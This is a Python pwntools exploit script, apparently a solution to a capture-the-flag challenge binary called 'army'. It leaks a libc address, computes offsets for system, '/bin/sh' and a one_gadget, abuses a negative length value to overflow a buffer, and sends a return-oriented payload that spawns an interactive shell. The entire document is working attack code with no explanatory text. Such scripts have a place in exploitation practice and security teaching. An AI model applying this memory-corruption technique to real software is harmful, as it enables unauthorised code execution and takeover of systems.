#!/usr/bin/python
from pwn import *
context(log_level='debug')

p=process('./army')

def join(name,height,weight,anslen,description):
    p.recvuntil('promotion\n')
    p.sendline('1')
    p.recvuntil('Enter name: ')
    p.sendline(name)
    p.recvuntil('height: ')
    p.sendline(height)
    p.recvuntil('weight: ')
    p.sendline(weight)
    p.recvuntil('answer: ')
    p.sendline(anslen)
    p.recvuntil('description: ')
    p.sendline(description)


def trick(name,height,weight,anslen,description):
    p.recvuntil('promotion\n')
    p.sendline('1')
    p.recvuntil('Enter name: ')
    p.sendline(name)
    p.recvuntil('height: ')
    p.sendline(height)
    p.recvuntil('weight: ')
    p.sendline(weight)
    p.recvuntil('answer: ')
    p.sendline(anslen)

def get_promotion(payload):
   p.recvuntil('promotion\n')
   p.sendline('3')
   p.recvuntil('answer : ')
   p.send(payload)
#0x45216  ret rax=0
#0x4526a  ret [$rsp+0x38]=0
#0xf02a4  ret [$rsp+0x58]=0
#0xf1147  ret [$rsp+0x78]=0

one_gadget=0x45216
#ret=b *0x0000000000400B8C
puts_offset=0x000000000006f690
p.recvuntil("Beginner's Luck : ")
data=p.recvuntil('\n')
leak=u64(data[:-1].ljust(8,'\x00'))
print 'leak='+hex(leak)
libc=leak-puts_offset
print 'libc='+hex(libc)
libc_binsh=libc+0x18cd57
system_addr=libc+0x0000000000045390
execve_addr=libc+one_gadget
poprdi=0x00400d03
xorrax=libc+0x0008b8c5
print 'one_gadget='+hex(execve_addr)
join('A'*8,'123','123',str(0x50),'B')
get_promotion('A')
trick('A'*8,'123','123','-1','B')
#payload='B'*0x38+p64(poprdi)+p64(libc_binsh)+p64(system_addr)
#one_gadget=0x45216
payload='B'*0x38+p64(xorrax)+p64(execve_addr)
x=raw_input()
#payload='B'*0x38+p64(execve_addr)
get_promotion(payload)
p.interactive()
